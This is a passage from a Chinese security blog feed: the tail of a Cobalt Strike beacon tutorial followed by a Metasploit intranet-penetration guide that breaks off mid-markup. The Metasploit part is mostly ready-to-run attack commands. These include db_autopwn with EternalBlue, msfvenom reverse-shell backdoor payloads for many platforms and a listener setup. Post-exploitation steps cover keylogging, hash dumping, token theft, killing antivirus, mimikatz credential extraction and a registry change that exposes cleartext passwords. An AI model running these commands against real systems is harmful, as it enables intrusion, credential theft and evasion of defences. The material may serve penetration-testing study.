A记录作为数据通道（仅支持DNS上线Beacon）mode dns-txt 使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）mode dns6 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）mv 移动文件net 网络和主机探测工具（内置net命令）note 给当前会话添加备注信息portscan 网络端口扫描powerpick 内存执行Powershell命令（不调用powershell.exe）powershell 通过powershell.exe执行Powershell命令powershell-import 导入本地powershell脚本到当前会话中ppid 为所有新运行的进程设置伪造的父进程PIDprintscreen 使用PrintScr方式截屏ps 显示进程列表psinject 注入到指定进程后在内存中执行Powershell命令（不调用powershell.exe)pth 使用Mimikatz执行Pass-the-hashpwd 显示当前目录reg 查询注册表remote-exec 在远程机器上执行命令（横向移动）rev2self 恢复原始进程访问令牌（access token）rm 删除文件或文件夹rportfwd 反向端口转发（从Cobalt Strike Teamserver发起连接）rportfwd_local 反向端口转发（从Cobalt Strike客户端发起连接）run 在目标上执行程序（有回显）runas 以另一个用户身份执行程序runasadmin 以高权限执行程序runu 以另一个进程PID作为父进程PID，并以其用户身份执行程序screenshot 截屏screenwatch 屏幕监控，每隔一段时间截屏setenv 设置环境变量shell 使用cmd.exe执行命令shinject 注入shellcode到指定进程中shspawn 创建傀儡进程并注入shellcode到其中运行sleep 设置beacon回连间隔时间socks 启动SOCKS4a代理服务器socks stop 停止SOCKS4a代理服务器spawn 创建一个新Beacon会话spawnas 以另一个用户身份创建一个新Beacon会话spawnto 设置创建新进程时使用的可执行文件路径（傀儡进程的宿主exe文件路径）spawnu 以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话spunnel 运行第三方agent shellcode并将其反向代理到控制端（从CobaltStrike Teamserver发起连接）spunnel_local 运行第三方agent shellcode并将其反向代理到控制端（从CobaltStrike客户端发起连接）ssh 通过SSH连接远程主机（使用账号密码认证）ssh-key 通过SSH连接远程主机（使用证书私钥认证）steal_token 从指定进程中窃取访问令牌（access token)timestomp 复制B文件的创建、访问、修改时间戳到A文件（文件时间戳伪造）unlink 断开与beacon的连接（用于通过TCP、命名管道连接的beacon）upload 上传文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="72-心跳时间"><a class="markdownIt-Anchor" href="#72-心跳时间">#</a> 7.2 心跳时间</h2><ul><li>beacon 的默认心跳时间是 60s，即 60 秒受害机器与服务器进行一次通信，一般在 beacon 中将 sleep 设置为 5，设置为 0 则表示即时通信，使用 socks 代理需要设置 sleep 为 0</li><li>sleep 为 0 时称 beacon 为交互模式</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924152724011.png" alt="image-20220924152724011"></p><h2 id="73-执行cmd命令"><a class="markdownIt-Anchor" href="#73-执行cmd命令">#</a> 7.3 执行 cmd 命令</h2><ul><li>在 beacon 中执行 cmd 命令需要在命令前加 <code>shell</code> ，如 <code>shell ipconfig</code></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924152827931.png" alt="image-20220924152827931"></p><h2 id="74-截图"><a class="markdownIt-Anchor" href="#74-截图">#</a> 7.4 截图</h2><ul><li>在上线主机中右键<mark>浏览探测 -&gt; 屏幕截图</mark>或直接在 beacon 中输入 <code>screenshot</code>  可进行屏幕截图</li><li>截图结果在<mark>视图 -&gt; 屏幕截图</mark>中查看</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153138542.png" alt="image-20220924153138542"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153151816.png" alt="image-20220924153151816"></p><h2 id="75-端口扫描"><a class="markdownIt-Anchor" href="#75-端口扫描">#</a> 7.5 端口扫描</h2><ul><li>右键主机，<mark>浏览探测 -&gt; 端口扫描</mark>进行端口扫描</li><li>可以选择主机上的指定网卡进行网段扫描</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153302815.png" alt="image-20220924153302815"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153426801.png" alt="image-20220924153426801"></p><h2 id="76-网络探测"><a class="markdownIt-Anchor" href="#76-网络探测">#</a> 7.6 网络探测</h2><ul><li>beacon 提供 <code>net</code>  命令进行网络探测， <code>help net</code>  查看命令帮助</li></ul><pre class="line-numbers language-none"><code class="language-none">Use: net [命令] [参数]Beacon内置的主机和网络枚举探测工具。 支持的 [命令] 列表有：    命令 描述    ------- -----------    computers 列出域中的主机（通过组）    domain 显示该主机的域    dclist 列出域控制器    domain_controllers 列出域控制器（通过组）    domain_trusts 列出域信任    group 列出组中的成员组和成员用户    localgroup 列出本地组中的成员组和成员用户    logons 列出登录到指定主机的用户    sessions 列出指定主机上的会话    share 列出指定主机上的共享    user 列出用户和用户信息    time 显示指定主机上的时间    view 列出域中的主机（通过browser服务）使用 &quot;help net [命令]&quot; 了解更多信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>net view</code>  查看域中的主机</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153737549.png" alt="image-20220924153737549"></p><ul><li><code>net dclist</code>  列出域控</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220924153812390.png" alt="image-20220924153812390"></p><h2 id="77-浏览器代理"><a class="markdownIt-Anchor" href="#77-浏览器代理">#</a> 7.7 浏览器代理</h2><ul><li>jquery c2</li><li>malleable-c2-master</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-cobalt-strike介绍&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-cobalt-strike介绍&quot;&gt;#&lt;/a&gt; 1、Cobalt Strike 介绍&lt;/h1&gt;
&lt;h2 id=&quot;11-介绍&quot;&gt;&lt;a class=&quot;mar</summary>
      
    
    
    
    <category term="web安全" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit内网篇</title>
    <link href="http://example.com/post/Metasploit%E5%86%85%E7%BD%91%E7%AF%87.html"/>
    <id>http://example.com/post/Metasploit%E5%86%85%E7%BD%91%E7%AF%87.html</id>
    <published>2022-10-06T14:00:44.000Z</published>
    <updated>2022-10-06T14:01:51.809Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">#常用命令sessions -K 结束全部会话<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="1-数据库后端"><a class="markdownIt-Anchor" href="#1-数据库后端">#</a> 1、数据库后端</h1><p>关于数据库操作：</p><pre class="line-numbers language-none"><code class="language-none">db_connectdb_disconnectdb_exportdb_importdb_nmapdb_rebuild_cachedb_removedb_savedb_status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915212758022.png" alt="image-20220915212758022"></p><ul><li>启动 postgresql 数据库</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> postgresql start <span class="token comment">#启动服务</span><span class="token function">sudo</span> <span class="token function">service</span> postgresql status <span class="token comment">#查看服务状态</span><span class="token function">sudo</span> <span class="token function">netstat</span> -antpo <span class="token comment">#查看端口</span><span class="token function">sudo</span> msfdb init <span class="token comment">#初始化数据库</span><span class="token function">sudo</span> msfdb reinit <span class="token comment">#重新初始化数据库</span><span class="token comment"># 数据库初始化成功后会产生一个/usr/share/metasploit-framework/config/database.yml文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><mark>注意究极大坑：postgresql 需要在环境为 en-US 情况下使用，否则会无法开启 5432 监听，解决方法为修改 terminal 编码或者系统语言</mark></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916215226763.png" alt="image-20220916215226763"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916211215954.png" alt="image-20220916211215954"></p><ul><li>使用 msfconsole 的 db_connection 连接数据库</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> db_connect -y /usr/share/metasploit-framework/config/database.yml <span class="token comment">#使用数据库文件进行连接</span>msf6 <span class="token operator">></span> db_status <span class="token comment">#查看连接状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916215359154.png" alt="image-20220916215359154"></p><ul><li>使用 db_nmap 对主机进行扫描，db_nmap 和 nmap 的使用方法相同</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> db_nmap <span class="token number">10.10</span>.10.135 -sV -A <span class="token comment">#对常用端口进行扫描</span>msf6 <span class="token operator">></span> services <span class="token comment">#查看已存在的db_nmap服务，可查看所有扫描结果</span>msf6 <span class="token operator">></span> services --help <span class="token comment">#查看帮助手册</span>msf6 <span class="token operator">></span> services -d IP <span class="token comment">#删除指定IP的扫描记录</span>msf6 <span class="token operator">></span> db_nmap <span class="token number">10.10</span>.10.0/24 -p <span class="token number">445</span> <span class="token comment">#扫描C段445端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220159392.png" alt="image-20220916220159392"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220231372.png" alt="image-20220916220231372"></p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220656179.png" alt="image-20220916220656179"></p><ul><li>hosts 查看已扫描过的 IP</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> hosts <span class="token comment">#查看已扫描过的IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220916220716095.png" alt="image-20220916220716095"></p><h2 id="12-配合db_autopwn对主机实现自动攻击"><a class="markdownIt-Anchor" href="#12-配合db_autopwn对主机实现自动攻击">#</a> 1.2 配合 db_autopwn 对主机实现自动攻击</h2><ul><li>db_autopwn：<a href="https://github.com/hahwul/metasploit-autopwn">GitHub - hahwul/metasploit-autopwn: db_autopwn plugin of metasploit</a></li><li>将文件上传到 kali 桌面，执行 cp 命令导入到 msf 目录下</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> db_autopwn.rb /usr/share/metasploit-framework/plugins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 msf 导入插件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> load db_autopwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 autopwn 进行攻击</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 <span class="token operator">></span> db_autopwn <span class="token comment">#查看帮助文档</span>msf6 <span class="token operator">></span> db_autopwn -p -R great -e -q IP <span class="token comment">#指定IP进行扫描</span>msf6 <span class="token operator">></span> db_autopwn -p -R great -e -q <span class="token comment">#如果不指定IP，默认扫描hosts已存的所有主机</span><span class="token comment"># 因为有防火墙的原因，建议使用指定EXP攻击指定端口服务</span>db_autopwn -p -m exploit/windows/smb/ms17_010_eternalblue -e <span class="token comment">#指定模块进行攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2-msf生成后门"><a class="markdownIt-Anchor" href="#2-msf生成后门">#</a> 2、msf 生成后门</h1><h2 id="21-msfvenom"><a class="markdownIt-Anchor" href="#21-msfvenom">#</a> 2.1 msfvenom</h2><ul><li><p>msfvenom：攻击载荷生成和编码器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#主要参数</span>-p payload-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值LHOST,LPORT 监听上线的主机IP和端口-f exe 生成EXE格式使用msfvenom -l 可以查看可以利用payloadmsfvenom -l<span class="token operator">|</span> <span class="token function">grep</span> windows <span class="token operator">|</span> <span class="token function">grep</span> x64 <span class="token operator">|</span> <span class="token function">grep</span> tcp 选择payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="22-生成可执行文件"><a class="markdownIt-Anchor" href="#22-生成可执行文件">#</a> 2.2 生成可执行文件</h2><ul><li>后门 payload 大全</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Linux:</span>msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elfmsfvenom -p linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f elf <span class="token operator">></span> shell.elf<span class="token comment">#Windows:</span>msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>YourPort to Connect On<span class="token operator">></span> -f exe <span class="token operator">></span> shell.exemsfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>YourPort to Connect On<span class="token operator">></span> -f exe <span class="token operator">></span> shell.exe<span class="token comment">#Mac:</span>msfvenom -p osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f macho <span class="token operator">></span> shell.machomsfvenom -p osx/x64/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f macho <span class="token operator">></span> shell.macho<span class="token comment">#PHP:</span>msfvenom -p php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.php<span class="token function">cat</span> shell.php <span class="token operator">|</span> pbcopy <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">echo</span> <span class="token string">'&lt;?php '</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">></span> shell.php <span class="token operator">&amp;&amp;</span> pbpaste <span class="token operator">>></span> shell.php<span class="token comment">#ASP:</span>msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>YourPort to Connect On<span class="token operator">></span> -f asp <span class="token operator">></span> shell.asp<span class="token comment">#JSP:</span>msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.jsp<span class="token comment">#WAR:</span>msfvenom -p java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f war <span class="token operator">></span> shell.war<span class="token comment">#Python:</span>msfvenom -p cmd/unix/reverse_python <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.py<span class="token comment">#Bash:</span>msfvenom -p cmd/unix/reverse_bash <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.sh<span class="token comment">#Perl:</span>msfvenom -p cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your IP Address<span class="token operator">></span> <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token operator">&lt;</span>Your Port to Connect On<span class="token operator">></span> -f raw <span class="token operator">></span> shell.pl<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="23-开启监听"><a class="markdownIt-Anchor" href="#23-开启监听">#</a> 2.3 开启监听</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsolemsf6 <span class="token operator">></span> use exploit/multi/handler <span class="token comment">#使用监听模块</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options <span class="token comment">#查看参数</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show advanced <span class="token comment">#查看高级参数</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lport <span class="token number">4444</span> <span class="token comment">#设置监听端口</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> lhost <span class="token number">10.10</span>.10.132 <span class="token comment">#设置监听IP</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp <span class="token comment">#设置payload，与2.2生成文件的payload相同</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit <span class="token comment">#执行监听</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220917105406805.png" alt="image-20220917105406805"></p><h2 id="24-扩展监听命令"><a class="markdownIt-Anchor" href="#24-扩展监听命令">#</a> 2.4 扩展监听命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit -j -z <span class="token comment">#-j：将会话作为job开始运行，可执行jobs查看所有会话；-z：不立即执行session交换，可后台运行</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> ExitOnSession <span class="token boolean">false</span> <span class="token comment">#让connection保持连接(即使一个连接退出,仍然保持listening状态)</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> PrependMigrate <span class="token boolean">true</span> <span class="token comment">#自动添加新进程</span><span class="token comment">#启动msf时自动开启监听</span>msfconsole -x <span class="token string">"use exploit/multi/handler; set payload windows/meterpreter/reverse_http; set lhost 127.0.0.1; set lport 1234; exploit -j;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220917105817281.png" alt="image-20220917105817281"></p><h2 id="25-会话操作"><a class="markdownIt-Anchor" href="#25-会话操作">#</a> 2.5 会话操作</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> background <span class="token comment">#将会话放置到后台</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> sessions <span class="token comment">#查看所有会话</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> sessions <span class="token number">1</span> <span class="token comment">#选择指定会话</span>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> sessions -k <span class="token number">1</span> <span class="token comment">#结束指定会话</span>Ctrl+z <span class="token comment">#把会话放到后台</span>Ctrl+c <span class="token comment">#结束会话</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-meterpreter后渗透"><a class="markdownIt-Anchor" href="#3-meterpreter后渗透">#</a> 3、Meterpreter 后渗透</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> background 放回后台meterpreter <span class="token operator">></span> <span class="token builtin class-name">exit</span> 关闭会话meterpreter <span class="token operator">></span> <span class="token builtin class-name">help</span> 帮助信息meterpreter <span class="token operator">></span> Sysinfo 系统平台信息meterpreter <span class="token operator">></span> screenshot 屏幕截取meterpreter <span class="token operator">></span> shell 命令行shell <span class="token punctuation">(</span>exit退出<span class="token punctuation">)</span>meterpreter <span class="token operator">></span> getlwd 查看本地目录meterpreter <span class="token operator">></span> lcd 切换本地目录meterpreter <span class="token operator">></span> <span class="token builtin class-name">pwd</span> 查看目录meterpreter <span class="token operator">></span> <span class="token function">ls</span> 查看文件目录列表meterpreter <span class="token operator">></span> <span class="token builtin class-name">cd</span> 切换目录meterpreter <span class="token operator">></span> <span class="token function">rm</span> 删除文件meterpreter <span class="token operator">></span> download C:<span class="token punctuation">\</span><span class="token punctuation">\</span>Users<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">123</span><span class="token punctuation">\</span><span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">1</span>.txt <span class="token number">1</span>.txt 下载文件meterpreter <span class="token operator">></span> upload /var/www/wce.exe wce.exe 上传文件meterpreter <span class="token operator">></span> search -d c: -f *.doc 搜索文件meterpreter <span class="token operator">></span> execute -f cmd.exe -i 执行程序/命令meterpreter <span class="token operator">></span> <span class="token function">ps</span> 查看进程meterpreter <span class="token operator">></span> run post/windows/capture/keylog_recorder 键盘记录meterpreter <span class="token operator">></span> getuid 查看当前用户权限meterpreter <span class="token operator">></span> use priv 加载特权模块meterpreter <span class="token operator">></span> getsystem 提升到SYSTEM权限meterpreter <span class="token operator">></span> hashdump 导出密码散列meterpreter <span class="token operator">></span> <span class="token function">ps</span> 查看高权限用户PIDmeterpreter <span class="token operator">></span> steal_token <span class="token operator">&lt;</span>PID<span class="token operator">></span> 窃取令牌meterpreter <span class="token operator">></span> rev2self 恢复原来的令牌meterpreter <span class="token operator">></span> migrate pid 迁移进程meterpreter <span class="token operator">></span> run killav 关闭杀毒软件meterpreter <span class="token operator">></span> run getgui-e 启用远程桌面meterpreter <span class="token operator">></span> portfwd <span class="token function">add</span> -l <span class="token number">1234</span> -p <span class="token number">3389</span> -r <span class="token operator">&lt;</span>目标IP<span class="token operator">></span> 端口转发meterpreter <span class="token operator">></span> run get_local_subnets 获取内网网段信息meterpreter <span class="token operator">></span> run autoroute -s <span class="token operator">&lt;</span>内网网段<span class="token operator">></span> 创建自动路由meterpreter <span class="token operator">></span> run autoroute -p 查看自动路由表创建代理通道:msf <span class="token operator">></span> use auxiliary/server/socks4a 设置socks4代理模块msf auxiliary<span class="token punctuation">(</span>socks4a<span class="token punctuation">)</span> <span class="token operator">></span> show optionsmsf auxiliary<span class="token punctuation">(</span>socks4a<span class="token punctuation">)</span> <span class="token operator">></span> run配置proxychains参数：<span class="token function">nano</span> /etc/proxychains.conf 修改代理监听端口,和前面端口一致quite_mode 设置成安静模式：去掉如下参数前面的注释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="31-常用命令"><a class="markdownIt-Anchor" href="#31-常用命令">#</a> 3.1 常用命令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> run post/windows/capture/keylog_recorder <span class="token comment">#记录键盘，CTRL+C结束后会保存到一个txt文件中</span>meterpreter <span class="token operator">></span> screenshot <span class="token comment">#屏幕截取</span>meterpreter <span class="token operator">></span> hashdump <span class="token comment">#导出密码散列</span>meterpreter <span class="token operator">></span> run hashdump <span class="token comment">#导出密码散列</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="32-kiwi使用"><a class="markdownIt-Anchor" href="#32-kiwi使用">#</a> 3.2 kiwi 使用</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> load kiwi <span class="token comment">#导入kiwi模块</span>meterpreter <span class="token operator">></span> kiwi --help <span class="token comment">#查看帮助手册</span>meterpreter <span class="token operator">></span> creds_all <span class="token comment">#导出所有凭证</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">creds_all：列举所有凭据creds_kerberos：列举所有kerberos凭据creds_msv：列举所有msv凭据creds_ssp：列举所有ssp凭据creds_tspkg：列举所有tspkg凭据creds_wdigest：列举所有wdigest凭据dcsync：通过DCSync检索用户帐户信息dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RIDgolden_ticket_create：创建黄金票据kerberos_ticket_list：列举kerberos票据kerberos_ticket_purge：清除kerberos票据kerberos_ticket_use：使用kerberos票据kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令lsa_dump_sam：dump出lsa的SAMlsa_dump_secrets：dump出lsa的密文password_change：修改密码wifi_list：列出当前用户的wifi配置文件wifi_list_shared：列出共享wifi配置文件/编码creds_all <span class="token comment">#该命令可以列举系统中的明文密码</span>kiwi_cmdkiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令kiwi_cmd sekurlsa::logonpasswords <span class="token comment">#类似mimikatz获取全部信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>提示：在 Windows2012 系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取。</li></ul><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="33-windows-shell乱码解决"><a class="markdownIt-Anchor" href="#33-windows-shell乱码解决">#</a> 3.3 windows shell 乱码解决</h2><ul><li>进入 shell 后使用  <code>chcp 65001</code>  解决</li></ul><h2 